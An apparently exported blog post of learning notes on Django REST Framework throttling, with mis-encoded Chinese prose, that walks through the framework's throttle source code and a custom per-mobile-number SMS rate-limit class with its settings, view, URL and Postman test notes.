        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Django REST Framework Learning Notes (13): Throttle</strong></em></li><li>Author: dog2</li></ul><hr /><h1 id="Âü∫Êú¨‰ø°ÊÅØ">Âü∫Êú¨‰ø°ÊÅØ</h1><ul><li>Ê∫êÁ†Å <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VuY29kZS9kamFuZ28tcmVzdC1mcmFtZXdvcmsvYmxvYi9tYXN0ZXIvcmVzdF9mcmFtZXdvcmsvdGhyb3R0bGluZy5weQ==">rest_framework.throttling<i class="fa fa-external-link-alt"></i></span></li><li>ÂÆòÊñπÊñáÊ°£ <span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvdGhyb3R0bGluZy8=">API Guide - Throttling<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hlbGxvX2RyZi90cmVlL21hc3Rlci9ubzEzX2RyZl90aHJvdHRsZS8=">Êú¨Êñádemo‰ª£Á†ÅGithub<i class="fa fa-external-link-alt"></i></span></li></ul><a id="more"></a><h1 id="Ê∫êÁ†ÅÂàÜÊûê">Ê∫êÁ†ÅÂàÜÊûê</h1><h2 id="ÂÖ•Âè£">ÂÖ•Âè£</h2><p>‰ªé<code>rest_framework.views.APIView</code>ÁöÑ<code>dispath(self, request, *args, **kwargs)</code>‰∏ãÊâãÔºå<code>dispath</code>ÊñπÊ≥ïÂÜÖ <code>self.initial(request, *args, **kwargs)</code> ËøõÂÖ•‰∏âÂ§ßËÆ§ËØÅ</p><ul><li>ËÆ§ËØÅÁªÑ‰ª∂ <code>self.perform_authentication(request)</code><ul><li>Ê†°È™åÁî®Êà∑ÔºöÊ∏∏ÂÆ¢„ÄÅÂêàÊ≥ïÁî®Êà∑„ÄÅÈùûÊ≥ïÁî®Êà∑</li><li>Ê∏∏ÂÆ¢Ôºö‰ª£Ë°®Ê†°È™åÈÄöËøáÔºåÁõ¥Êé•ËøõÂÖ•‰∏ã‰∏ÄÊ≠•Ê†°È™åÔºàÊùÉÈôêÊ†°È™åÔºâ</li><li>ÂêàÊ≥ïÁî®Êà∑Ôºö‰ª£Ë°®Ê†°È™åÈÄöËøáÔºåÂ∞ÜÁî®Êà∑Â≠òÂÇ®Âú®<code>request.user</code>‰∏≠ÔºåÂÜçËøõÂÖ•‰∏ã‰∏ÄÊ≠•Ê†°È™åÔºàÊùÉÈôêÊ†°È™åÔºâ</li><li>ÈùûÊ≥ïÁî®Êà∑Ôºö‰ª£Ë°®Ê†°È™åÂ§±Ë¥•ÔºåÊäõÂá∫ÂºÇÂ∏∏ÔºåËøîÂõû403ÊùÉÈôêÂºÇÂ∏∏ÁªìÊûú</li></ul></li><li>ÊùÉÈôêÁªÑ‰ª∂ <code>self.check_permissions(request)</code><ul><li>Ê†°È™åÁî®Êà∑ÊùÉÈôêÔºöÂøÖÈ°ªÁôªÂΩï„ÄÅÊâÄÊúâÁî®Êà∑„ÄÅÁôªÂΩï‰πãÂêéËØªÂÜôÔºåÊ∏∏ÂÆ¢Âè™ËØª„ÄÅËá™ÂÆö‰πâÁî®Êà∑ËßíËâ≤</li><li>ËÆ§ËØÅÈÄöËøáÔºöÂèØ‰ª•ËøõÂÖ•‰∏ã‰∏ÄÊ≠•Ê†°È™åÔºàÈ¢ëÁéáËÆ§ËØÅÔºâ</li><li>ËÆ§ËØÅÂ§±Ë¥•ÔºöÊäõÂá∫ÂºÇÂ∏∏ÔºåËøîÂõû403ÊùÉÈôêÂºÇÂ∏∏ÁªìÊûú</li></ul></li><li>È¢ëÁéáÁªÑ‰ª∂ <code>self.check_throttles(request)</code><ul><li>ÈôêÂà∂ËßÜÂõæÊé•Âè£Ë¢´ËÆøÈóÆÁöÑÈ¢ëÁéáÊ¨°Êï∞ - ÈôêÂà∂ÁöÑÊù°‰ª∂(IP„ÄÅid„ÄÅÂîØ‰∏ÄÈîÆ)„ÄÅÈ¢ëÁéáÂë®ÊúüÊó∂Èó¥(s„ÄÅm„ÄÅh)„ÄÅÈ¢ëÁéáÁöÑÊ¨°Êï∞Ôºà3/sÔºâ</li><li>Ê≤°ÊúâËææÂà∞ÈôêÊ¨°ÔºöÊ≠£Â∏∏ËÆøÈóÆÊé•Âè£</li><li>ËææÂà∞ÈôêÊ¨°ÔºöÈôêÂà∂Êó∂Èó¥ÂÜÖ‰∏çËÉΩËÆøÈóÆÔºåÈôêÂà∂Êó∂Èó¥ËææÂà∞ÂêéÔºåÂèØ‰ª•ÈáçÊñ∞ËÆøÈóÆ</li></ul></li></ul><p>Êú¨Êñá‰ªãÁªçÊùÉÈôêÁªÑ‰ª∂„ÄÇ</p><h2 id="views.apiview.initial">views.APIView.initial()</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">initial</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Runs anything that needs to occur prior to calling the method handler.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    self.format_kwarg = self.get_format_suffix(**kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Perform content negotiation and store the accepted info on the request</span></span><br><span class="line">    neg = self.perform_content_negotiation(request)</span><br><span class="line">    request.accepted_renderer, request.accepted_media_type = neg</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Determine the API version, if versioning is in use.</span></span><br><span class="line">    version, scheme = self.determine_version(request, *args, **kwargs)</span><br><span class="line">    request.version, request.versioning_scheme = version, scheme</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Ensure that the incoming request is permitted</span></span><br><span class="line">    self.perform_authentication(request)</span><br><span class="line">    self.check_permissions(request)</span><br><span class="line">    self.check_throttles(request)  <span class="comment">#È¢ëÁéáËÆ§ËØÅ</span></span><br></pre></td></tr></table></figure><h2 id="views.apiview.check_throttles">views.APIView.check_throttles()</h2><p>È¢ëÁéáÁªÑ‰ª∂ÊúÄÈáçË¶ÅÁöÑ‰∏§‰∏™ÊñπÊ≥ïÔºö<code>allow_request()</code>Âíå<code>wait()</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_throttles</span><span class="params">(self, request)</span>:</span>  <span class="comment">#È¢ëÁéáÁªÑ‰ª∂Ê†∏ÂøÉ‰ª£Á†Å</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Check if request should be throttled.</span></span><br><span class="line"><span class="string">    Raises an appropriate exception if the request is throttled.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    throttle_durations = []</span><br><span class="line">    <span class="keyword">for</span> throttle <span class="keyword">in</span> self.get_throttles():</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> throttle.allow_request(request, self):</span><br><span class="line">            throttle_durations.append(throttle.wait())</span><br></pre></td></tr></table></figure><h3 id="views.apiview.get_throttles">views.APIView.get_throttles()</h3><p>Âá∫Áé∞È¢ëÁéáÈÖçÁΩÆsettings‰ø°ÊÅØÔºåÁªèËøáÊü•ËØ¢Ê∫êÁ†ÅÁöÑsettingsÊñá‰ª∂ÂØπÈ¢ëÁéáÈÖçÁΩÆ‰∏∫Á©∫</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_throttles</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Instantiates and returns the list of throttles that this view uses.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> [throttle() <span class="keyword">for</span> throttle <span class="keyword">in</span> self.throttle_classes]  <span class="comment">#È¢ëÁéáÁªÑ‰ª∂ÈÖçÁΩÆ‰ø°ÊÅØ</span></span><br></pre></td></tr></table></figure><h3 id="throttling.simpleratethrottle">throttling.SimpleRateThrottle</h3><details><p><summary> <b><i>Source Code</i></b> </summary></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimpleRateThrottle</span><span class="params">(BaseThrottle)</span>:</span></span><br><span class="line">   </span><br><span class="line">    cache = default_cache</span><br><span class="line">    timer = time.time</span><br><span class="line">    cache_format = <span class="string">'throttle_%(scope)s_%(ident)s'</span></span><br><span class="line">    scope = <span class="literal">None</span></span><br><span class="line">    THROTTLE_RATES = api_settings.DEFAULT_THROTTLE_RATES</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> getattr(self, <span class="string">'rate'</span>, <span class="literal">None</span>):</span><br><span class="line">            self.rate = self.get_rate()  <span class="comment">#3.rateÂÄºÂ∞±ÊòØÊñπÊ≥ïget_rateÁöÑËøîÂõûÂÄºÔºàÈ¢ëÁéáÊ¨°Êï∞Ôºâ</span></span><br><span class="line">        self.num_requests, self.duration = self.parse_rate(self.rate)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_cache_key</span><span class="params">(self, request, view)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError(<span class="string">'.get_cache_key() must be overridden'</span>)</span><br><span class="line"></span><br><span class="line">„ÄÄ„ÄÄ<span class="comment">#get_rateÊúÄÂêéËøîÂõûÁöÑÁªìÊûúÊòØËÆæÁΩÆÁöÑÈ¢ëÁéáÊ¨°Êï∞</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_rate</span><span class="params">(self)</span>:</span><span class="comment">#1.Âú®Ëá™ÂÆö‰πâÁ±ª‰∏≠Ë¶ÅÁªôscopeÂ±ûÊÄßËµãÂÄº</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> getattr(self, <span class="string">'scope'</span>, <span class="literal">None</span>):</span><br><span class="line">            msg = (<span class="string">"You must set either `.scope` or `.rate` for '%s' throttle"</span> %</span><br><span class="line">                   self.__class__.__name__)</span><br><span class="line">            <span class="keyword">raise</span> ImproperlyConfigured(msg)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> self.THROTTLE_RATES[self.scope]  <span class="comment">#2.Âú®settingsÊñá‰ª∂‰∏≠ÈÖçÁΩÆscopeÂ±ûÊÄßÂÄºÂØπÂ∫îÁöÑvalue</span></span><br><span class="line">        <span class="keyword">except</span> KeyError:</span><br><span class="line">            msg = <span class="string">"No default throttle rate set for '%s' scope"</span> % self.scope</span><br><span class="line">            <span class="keyword">raise</span> ImproperlyConfigured(msg)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_rate</span><span class="params">(self, rate)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> rate <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> (<span class="literal">None</span>, <span class="literal">None</span>)</span><br><span class="line">        num, period = rate.split(<span class="string">'/'</span>)  <span class="comment">#4.rateÊúâÂÄºÔºåÊ†πÊçÆÊ∫êÁ†ÅÔºåËá™ÂÆö‰πâÁöÑrateÂÄºÊòØ‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤ÔºåËÄå‰∏îÊòØËøôÁßçÊ†ºÂºèÔºö'Êï∞Â≠ó/‰ª•s,m,h,d‰πãÁ±ªÂºÄÂ§¥ÁöÑÂ≠óÊØç'</span></span><br><span class="line">        num_requests = int(num)    <span class="comment">#5.Ëé∑ÂæóÁöÑÊï∞Â≠óÂ∞±ÊòØËÆæÁΩÆÁöÑÈ¢ëÁéáÊ¨°Êï∞</span></span><br><span class="line">        duration = &#123;<span class="string">'s'</span>: <span class="number">1</span>, <span class="string">'m'</span>: <span class="number">60</span>, <span class="string">'h'</span>: <span class="number">3600</span>, <span class="string">'d'</span>: <span class="number">86400</span>&#125;[period[<span class="number">0</span>]]  <span class="comment">#6.Ëé∑ÂæóÊòØÈó¥ÈöîÁöÑÊó∂Èó¥Ôºà‰ª•Áßí‰∏∫Âçï‰ΩçÔºâ</span></span><br><span class="line">        <span class="keyword">return</span> (num_requests, duration)  <span class="comment">#7.Êï∞ÊçÆËøîÂõûÁªô__init__ÔºåËß£ÂéãËµãÂÄº</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">allow_request</span><span class="params">(self, request, view)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.rate <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">„ÄÄ„ÄÄ„ÄÄ„ÄÄ„ÄÄ„ÄÄ„ÄÄ„ÄÄ„ÄÄ„ÄÄ„ÄÄ<span class="comment">#get_cache_keyÂ∞±ÊòØË¶ÅÈáçÂÜôÁöÑÊñπÊ≥ïÔºåËã•‰∏çÈáçÂÜôÔºå‰ºöÁõ¥Êé•ÊäõÂá∫ÂºÇÂ∏∏</span></span><br><span class="line">        self.key = self.get_cache_key(request, view)  <span class="comment">#8.Ëá™ÂÆö‰πâÁöÑÊó∂ÂÄôÈúÄË¶ÅÈáçÂÜôÁöÑÊñπÊ≥ïÔºåÊúâËøîÂõûÂÄºÔºåÊîæÂÖ•ÁºìÂ≠ò‰∏≠</span></span><br><span class="line">        <span class="keyword">if</span> self.key <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        self.history = self.cache.get(self.key, [])  <span class="comment">#9.Ëé∑ÂèñÁºìÂ≠òÔºåÈÄöËøákeyÂèñÂÄº</span></span><br><span class="line">        self.now = self.timer()  <span class="comment">#10.ÂΩìÂâçÊó∂Èó¥</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Drop any requests from the history which have now passed the</span></span><br><span class="line">        <span class="comment"># throttle duration</span></span><br><span class="line">        <span class="keyword">while</span> self.history <span class="keyword">and</span> self.history[<span class="number">-1</span>] &lt;= self.now - self.duration:</span><br><span class="line">            self.history.pop()</span><br><span class="line">        <span class="keyword">if</span> len(self.history) &gt;= self.num_requests:</span><br><span class="line">            <span class="keyword">return</span> self.throttle_failure()</span><br><span class="line">        <span class="keyword">return</span> self.throttle_success()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">throttle_success</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.history.insert(<span class="number">0</span>, self.now)</span><br><span class="line">        self.cache.set(self.key, self.history, self.duration)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">throttle_failure</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">„ÄÄ„ÄÄ<span class="comment">#ËøîÂõûË∑ù‰∏ã‰∏ÄÊ¨°ËÉΩËØ∑Ê±ÇÁöÑÊó∂Èó¥ÔºåÈôêÂà∂ÁöÑËÆøÈóÆÊ¨°Êï∞Âú®parse_rateÂèØ‰ª•Ê±ÇÂá∫</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wait</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        Returns the recommended next request time in seconds.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> self.history:</span><br><span class="line">            remaining_duration = self.duration - (self.now - self.history[<span class="number">-1</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            remaining_duration = self.duration</span><br><span class="line"></span><br><span class="line">        available_requests = self.num_requests - len(self.history) + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> available_requests &lt;= <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> remaining_duration / float(available_requests)</span><br></pre></td></tr></table></figure></details><h2 id="ÂÜçÁúã-views.apiview.check_throttles">ÂÜçÁúã views.APIView.check_throttles()</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_throttles</span><span class="params">(self, request)</span>:</span></span><br><span class="line">    throttle_durations = []</span><br><span class="line">    <span class="comment"># 1ÔºâÈÅçÂéÜÈÖçÁΩÆÁöÑÈ¢ëÁéáËÆ§ËØÅÁ±ªÔºåÂàùÂßãÂåñÂæóÂà∞‰∏Ä‰∏™‰∏™È¢ëÁéáËÆ§ËØÅÁ±ªÂØπË±°Ôºà‰ºöË∞ÉÁî®È¢ëÁéáËÆ§ËØÅÁ±ªÁöÑ __init__() ÊñπÊ≥ïÔºâ</span></span><br><span class="line">    <span class="comment"># 2ÔºâÈ¢ëÁéáËÆ§ËØÅÁ±ªÂØπË±°Ë∞ÉÁî® allow_request ÊñπÊ≥ïÔºåÂà§Êñ≠ÊòØÂê¶ÈôêÊ¨°ÔºàÊ≤°ÊúâÈôêÊ¨°ÂèØËÆøÈóÆÔºåÈôêÊ¨°‰∏çÂèØËÆøÈóÆÔºâ</span></span><br><span class="line">    <span class="comment"># 3ÔºâÈ¢ëÁéáËÆ§ËØÅÁ±ªÂØπË±°Âú®ÈôêÊ¨°ÂêéÔºåË∞ÉÁî® wait ÊñπÊ≥ïÔºåËé∑ÂèñËøòÈúÄÁ≠âÂæÖÂ§öÈïøÊó∂Èó¥ÂèØ‰ª•ËøõË°å‰∏ã‰∏ÄÊ¨°ËÆøÈóÆ</span></span><br><span class="line">    <span class="comment"># Ê≥®ÔºöÈ¢ëÁéáËÆ§ËØÅÁ±ªÈÉΩÊòØÁªßÊâø SimpleRateThrottle Á±ª</span></span><br><span class="line">    <span class="keyword">for</span> throttle <span class="keyword">in</span> self.get_throttles():</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> throttle.allow_request(request, self):</span><br><span class="line">            <span class="comment"># Âè™Ë¶ÅÈ¢ëÁéáÈôêÂà∂‰∫ÜÔºåallow_request ËøîÂõûFalse‰∫ÜÔºåÊâç‰ºöË∞ÉÁî®wait</span></span><br><span class="line">            throttle_durations.append(throttle.wait())</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> throttle_durations:</span><br><span class="line">                <span class="comment"># Filter out `None` values which may happen in case of config / rate</span></span><br><span class="line">                <span class="comment"># changes, see #1438</span></span><br><span class="line">                durations = [</span><br><span class="line">                    duration <span class="keyword">for</span> duration <span class="keyword">in</span> throttle_durations</span><br><span class="line">                    <span class="keyword">if</span> duration <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span></span><br><span class="line">                ]</span><br><span class="line"></span><br><span class="line">                duration = max(durations, default=<span class="literal">None</span>)</span><br><span class="line">                self.throttled(request, duration)</span><br></pre></td></tr></table></figure><h1 id="Ëá™ÂÆö‰πâÈ¢ëÁéáÁ±ª">Ëá™ÂÆö‰πâÈ¢ëÁéáÁ±ª</h1><h2 id="ÊñπÊ≥ï">ÊñπÊ≥ï</h2><ol type="1"><li>Ëá™ÂÆö‰πâ‰∏Ä‰∏™ÁªßÊâø <code>SimpleRateThrottle</code> Á±ª ÁöÑÈ¢ëÁéáÁ±ª</li><li>ËÆæÁΩÆ‰∏Ä‰∏™ <code>scope</code> Á±ªÂ±ûÊÄßÔºåÂ±ûÊÄßÂÄº‰∏∫‰ªªÊÑèËßÅÂêçÁü•ÊÑèÁöÑÂ≠óÁ¨¶‰∏≤</li><li>Âú®settingsÈÖçÁΩÆÊñá‰ª∂‰∏≠ÔºåÈÖçÁΩÆdrfÁöÑ<code>DEFAULT_THROTTLE_RATES</code>ÔºåÊ†ºÂºè‰∏∫ <code>{scopeÂ≠óÁ¨¶‰∏≤ÂÄº: 'Ê¨°Êï∞/Êó∂Èó¥'}</code></li><li>Âú®Ëá™ÂÆö‰πâÈ¢ëÁéáÁ±ª‰∏≠ÈáçÂÜô get_cache_key ÊñπÊ≥ï<ul><li>ÈôêÂà∂ÁöÑÂØπË±°ËøîÂõû ‰∏éÈôêÂà∂‰ø°ÊÅØÊúâÂÖ≥ÁöÑÂ≠óÁ¨¶‰∏≤</li><li>‰∏çÈôêÂà∂ÁöÑÂØπË±°ËøîÂõû <code>None</code> (Âè™ËÉΩÊîæÂõû<code>None</code>Ôºå‰∏çËÉΩÊòØ<code>False</code>ÊàñÊòØ<code>''</code>Á≠â)</li></ul></li></ol><h2 id="Á§∫‰æã‰ª£Á†Å">Á§∫‰æã‰ª£Á†Å</h2><p>ÂÜô‰∏Ä‰∏™Áü≠‰ø°Êé•Âè£ÔºåËÆæÁΩÆ<code>1/min</code>È¢ëÁéáÈôêÂà∂</p><h3 id="utils.throttles.py">utils.throttles.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.throttling <span class="keyword">import</span> SimpleRateThrottle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SMSRateThrottle</span><span class="params">(SimpleRateThrottle)</span>:</span></span><br><span class="line">    scope = <span class="string">'sms'</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#Âè™ÂØπÊèê‰∫§ÊâãÊú∫Âè∑ÁöÑgetÊñπÊ≥ïËøõË°åÈôêÂà∂</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_cache_key</span><span class="params">(self, request, view)</span>:</span></span><br><span class="line">        mobile = request.query_params.get(<span class="string">'mobile'</span>)</span><br><span class="line">        <span class="comment">#Ê≤°ÊúâÊâãÊú∫Âè∑Â∞±‰∏çÂÅöÈ¢ëÁéáÈôêÂà∂</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> mobile:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="comment">#ËøîÂõûÁöÑ‰ø°ÊÅØÂèØ‰ª•Áî®ÊâãÊú∫Âè∑Âä®ÊÄÅÂèòÂåñÔºå‰∏î‰∏çÊòìÈáçÂ§çÁöÑÂ≠óÁ¨¶‰∏≤Ôºå‰Ωú‰∏∫ÁºìÂ≠òÁöÑkey</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'throttle_%(scope)s_%(ident)s'</span> % &#123;<span class="string">'scope'</span>: self.scope, <span class="string">'ident'</span>: mobile&#125;</span><br></pre></td></tr></table></figure><h3 id="settings.py">settings.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># drfÈÖçÁΩÆ</span></span><br><span class="line">REST_FRAMEWORK = &#123;</span><br><span class="line">    <span class="comment"># È¢ëÁéáÈôêÂà∂Êù°‰ª∂ÈÖçÁΩÆ</span></span><br><span class="line">    <span class="string">'DEFAULT_THROTTLE_RATES'</span>: &#123;</span><br><span class="line">        <span class="string">'sms'</span>: <span class="string">'1/min'</span></span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="views.py">views.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> .throttles <span class="keyword">import</span> SMSRateThrottle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestSMSAPIView</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="comment"># Â±ÄÈÉ®ÈÖçÁΩÆÈ¢ëÁéáËÆ§ËØÅ</span></span><br><span class="line">    throttle_classes = [SMSRateThrottle]</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> APIResponse(<span class="number">0</span>, <span class="string">'get Ëé∑ÂèñÈ™åËØÅÁ†Å OK'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> APIResponse(<span class="number">0</span>, <span class="string">'post Ëé∑ÂèñÈ™åËØÅÁ†Å  OK'</span>)</span><br></pre></td></tr></table></figure><h3 id="urls.py">urls.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'sms/'</span>, views.TestSMSAPIView.as_view()),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h2 id="postmanÊµãËØï">PostmanÊµãËØï</h2><ol type="1"><li>Âè™‰ºöÂØπ <code>/api/sms/?mobile=ÂÖ∑‰ΩìÊâãÊú∫Âè∑</code> Êé•Âè£Êâç‰ºöÊúâÈ¢ëÁéáÈôêÂà∂ÔºåËÆæÁΩÆ‰∫ÜÈôêÂà∂È¢ëÁéáÔºåÂà∞ËææËÆøÈóÆÊ¨°Êï∞Â∞±‰ºöÁ¶ÅÊ≠¢</li><li>ÂØπ <code>/api/sms/</code> ÊàñÂÖ∂‰ªñÊé•Âè£ÂèëÈÄÅÊó†ÈôêÂà∂</li><li>ÂØπÊï∞ÊçÆÂåÖÊèê‰∫§<code>mobileÁöÑ/api/sms/</code>Êé•Âè£Êó†ÈôêÂà∂</li><li>ÂØπ‰∏çÊòØ<code>mobile</code>ÔºàÂ¶Ç<code>phone</code>ÔºâÂ≠óÊÆµÊèê‰∫§ÁöÑÁîµËØùÊé•Âè£Êó†ÈôêÂà∂</li></ol>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
